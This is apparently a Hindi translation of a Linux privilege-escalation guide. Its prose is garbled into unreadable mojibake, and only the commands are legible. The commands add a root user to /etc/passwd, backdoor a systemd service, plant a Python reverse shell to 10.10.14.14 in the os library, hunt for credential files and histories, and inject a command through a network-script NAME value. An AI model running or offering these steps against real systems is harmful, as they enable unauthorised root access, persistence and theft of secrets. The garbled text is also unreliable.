рдкрд╣рд▓реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдбреНрд╕ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдХреЗ рд╕рд╛рде рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВред
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `рд╣реИрдХрд░` рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдЙрд╕рдХрд╛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛрдбрд╝реЗрдВред
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
рдЙрджрд╛: `рд╣реИрдХрд░: $1 $рд╣реИрдХрд░ $TzyKlv0/R/c28R.GAeLw.1:0:0:рд╣реИрдХрд░:/root:/bin/bash`

рдЕрдм рдЖрдк `su` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ `рд╣реИрдХрд░:рд╣реИрдХрд░` рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдбрдореА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗред
рдЪреЗрддрд╛рд╡рдиреА: рдЖрдк рдорд╢реАрди рдХреА рд╡рд░реНрддрдорд╛рди рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**рдзреНрдпрд╛рди рджреЗрдВ:** BSD рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореЛрдВ рдореЗрдВ `/etc/passwd` рдХреЛ `/etc/pwd.db` рдФрд░ `/etc/master.passwd` рдореЗрдВ рд╕реНрдерд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ `/etc/shadow` рдХреЛ `/etc/spwd.db` рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдорд╢реАрди **tomcat** рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк **/etc/systemd/ рдХреЗ рдЕрдВрджрд░ Tomcat рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ,** рддреЛ рдЖрдк рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### рдлреЛрд▓реНрдбрд░ рдЬрд╛рдБрдЪреЗрдВ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлреЛрд▓реНрдбрд░ рдмреИрдХрдЕрдк рдпрд╛ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (рд╢рд╛рдпрдж рдЖрдк рдЖрдЦрд┐рд░реА рд╡рд╛рд▓рд╛ рдирд╣реАрдВ рдкрдврд╝ рдкрд╛рдПрдВрдЧреЗ рд▓реЗрдХрд┐рди рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### рдЕрдЬреАрдм рд╕реНрдерд╛рди/рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### рдкрд┐рдЫрд▓реЗ рдорд┐рдирдЯреЛрдВ рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite рдбреАрдмреА рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_рдЗрддрд┐рд╣рд╛рд╕, .sudo\_as\_admin\_рд╕рдлрд▓, рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### рдЫрд┐рдкреЗ рд╣реБрдП рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **рдкрде рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ/рдмрд╛рдЗрдирд░реА**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЗрдВ**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **рдмреИрдХрдЕрдк**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### рдЬреНрдЮрд╛рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬрд┐рдирдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИ

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) рдХреЛрдб рдХреЛ рдкрдврд╝реЗрдВ, рдпрд╣ **рдХрдИ рд╕рдВрднрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬрддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдЙрдкрдХрд░рдг рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд╡рд╣ рд╣реИ: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) рдЬреЛ рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рдВрдбреЛрдЬ, рд▓рд┐рдирдХреНрд╕ рдФрд░ рдореИрдХ рдкрд░ рд╕реНрдерд╛рдиреАрдп рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рд╕реНрдЯреЛрд░ рдХрд┐рдП рдЧрдП рдХрдИ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рд▓реЙрдЧ

рдпрджрд┐ рдЖрдк рд▓реЙрдЧ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрдирдореЗрдВ **рджрд┐рд▓рдЪрд╕реНрдк/рдЧреЛрдкрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред рдЬрд┐рддрдирд╛ рдЕрдЬреАрдм рд▓реЙрдЧ рд╣реЛрдЧрд╛, рдЙрддрдирд╛ рд╣реА рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрдЧрд╛ (рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ)ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ "**рдмреБрд░рд╛**" рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП (рдмреИрдХрдбреЛрд░?) **рдСрдбрд┐рдЯ рд▓реЙрдЧ** рдЖрдкрдХреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рджреЗрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк **рдСрдбрд┐рдЯ рд▓реЙрдЧ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд░рд┐рдХреЙрд░реНрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЧреНрд░реБрдк рд▓реЙрдЧреНрд╕ рдкрдврд╝реЗрдВ** [**adm**](interesting-groups-linux-pe/#adm-group) рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдорджрджрдЧрд╛рд░ рд╣реЛрдЧрд╛ред

### рд╢реИрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### рдЬреЗрдиреЗрд░рд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЦреЛрдЬ/рд░реАрдЬреЗрдХреНрд╕

рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рднреА рдЪреЗрдХ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ рд╢рдмреНрдж "**рдкрд╛рд╕рд╡рд░реНрдб**" рд╣реЛрддрд╛ рд╣реИ рдЙрд╕рдХреЗ **рдирд╛рдо** рдореЗрдВ рдпрд╛ **рд╕рд╛рдордЧреНрд░реА** рдХреЗ рдЕрдВрджрд░, рдФрд░ рд▓реЙрдЧреНрд╕ рдореЗрдВ IPs рдФрд░ рдИрдореЗрд▓реНрд╕ рдХреА рднреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдпрд╛ рд╣реИрд╢ рд░реАрдЬреЗрдХреНрд╕ рдореЗрдВред\
рдореИрдВ рдпрд╣рд╛рдБ рд╕рднреА рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдЗрд╕рдХреА рд╕реВрдЪреА рдирд╣реАрдВ рджреЗрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБ рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдк рдЗрд╕рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЙрд╕ рдЖрдЦрд┐рд░реА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) рдХрд░рддрд╛ рд╣реИред

## рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ

### рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдЕрдЧрд░ рдЖрдкрдХреЛ рдкрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕ **рд╕реНрдерд╛рди** рд╕реЗ рдПрдХ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк **рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдСрдПрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдмреИрдХрдбреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЕрдЧрд░ рдЖрдк рдЬрд╣рд╛рдБ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рд╡рд╣рд╛рдБ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдСрдПрд╕.рдкрд╛рдп рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреА рдХреЙрдкреА рдФрд░ рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ)ред

рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдмреИрдХрдбреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ рдСрдПрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрдд рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐ рдЬреЛрдбрд╝реЗрдВ (рдЖрдИрдкреА рдФрд░ рдкреЛрд░реНрдЯ рдмрджрд▓реЗрдВ):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### рд▓реЙрдЧрд░реЛрдЯ рд╢реЛрд╖рдг

`рд▓реЙрдЧрд░реЛрдЯ` рдореЗрдВ рдПрдХ рдХрдордЬреЛрд░реА рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓реЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдЙрд╕рдХреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдкрд░ **рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `рд▓реЙрдЧрд░реЛрдЯ`, рдЕрдХреНрд╕рд░ **рд░реВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдирд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рдЬреИрд╕реЗ _**/etc/bash\_completion.d/**_ред _/var/log_ рдХреЗ рди рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдмрд▓реНрдХрд┐ рдХрд┐рд╕реА рднреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рднреА рдЬрд╣рд╛рдБ рд▓реЙрдЧ рдШреВрд░реНрдгрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

{% hint style="info" %}
рдпрд╣ рдХрдордЬреЛрд░реА `рд▓реЙрдЧрд░реЛрдЯ` рд╕рдВрд╕реНрдХрд░рдг `3.18.0` рдФрд░ рдкреБрд░рд╛рдиреЗ рдкрд░ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ
{% endhint %}

рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [**logrotten**](https://github.com/whotwagner/logrotten).

рдпрд╣ рдХрдордЬреЛрд░реА [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрдм рднреА рдЖрдкрдХреЛ рд▓рдЧреЗ рдХрд┐ рдЖрдк рд▓реЙрдЧ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рджреЗрдЦреЗрдВ рдХрд┐ рд╡рд╣ рд▓реЙрдЧ рдХреМрди рд╕рдВрднрд╛рд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рд▓реЙрдЧ рдХреЛ рд╕рд┐рдорд▓рд┐рдВрдХреНрд╕ рджреНрд╡рд╛рд░рд╛ рдЕрдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### /etc/sysconfig/network-scripts/ (рд╕реЗрдВрдЯреЛрд╕/рд░реЗрдбрд╣реИрдЯ)

**рдХрдордЬреЛрд░реА рд╕рдВрджрд░реНрдн:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

рдпрджрд┐, рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА `ifcf-<whatever>` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ _/etc/sysconfig/network-scripts_ рдореЗрдВ **рд▓рд┐рдЦрдиреЗ** рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реИ **рдпрд╛** рд╡рд╣ рдПрдХ рдореМрдЬреВрджрд╛ рдХреЛ **рд╕рдорд╛рдпреЛрдЬрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рддреЛ рдЖрдкрдХрд╛ **рд╕рд┐рд╕реНрдЯрдо рдкреВрдиреНрдб** рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, _ifcg-eth0_ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рд╡реЗ .INI рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗ рд▓рд┐рдирдХреНрд╕ рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрдХ (рдбрд┐рд╕реНрдкреИрдЪрд░.d) рджреНрд╡рд╛рд░рд╛ \~рд╕реЛрд░реНрд╕\~ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

рдореЗрд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрди рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ `NAME=` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рдВрднрд╛рд▓рд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдирд╛рдо рдореЗрдВ **рд╕рдлреЗрдж/рдЦрд╛рд▓реА рдЬрдЧрд╣ рд╣реИ рддреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЦрд╛рд▓реА рдЬрдЧрд╣ рдХреЗ рдмрд╛рдж рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдкрд╣рд▓реЗ рдЦрд╛рд▓реА рдЬрдЧрд╣ рдХреЗ рдмрд╛рдж рдХрд╛ рд╣рд░ рдХреБрдЫ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **рдЖрд░рдВрдн, рдЖрд░рдВрдн.рдбреА, рд╕рд┐рд╕реНрдЯрдордбреА, рдФрд░ рдЖрд░рд╕реА.рдбреА**

рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА `/etc/init.d` рд╕рд┐рд╕реНрдЯрдо рд╡реА рдЖрд░рдВрдн (SysVinit), **рдХреНрд▓рд╛рд╕рд┐рдХ рд▓рд┐рдирдХреНрд╕ рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди рд╕рд┐рд╕реНрдЯрдо** рдХреЗ рд▓рд┐рдП **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХрд╛ рдШрд░ рд╣реИред рдЗрд╕рдореЗрдВ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ `рд╢реБрд░реВ`, `рд░реЛрдХреЗрдВ`, `рдкреБрдирдГ рдЖрд░рдВрдн` рдФрд░ рдХрднреА-рдХрднреА `рд░реАрд▓реЛрдб` рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдпреЗ рд╕реАрдзреЗ рдпрд╛ `/etc/rc?.d/` рдореЗрдВ рдкрд╛рдП рдЧрдП рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд░реЗрдбрд╣реИрдЯ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рдкрде `/etc/rc.d/init.d` рд╣реИред

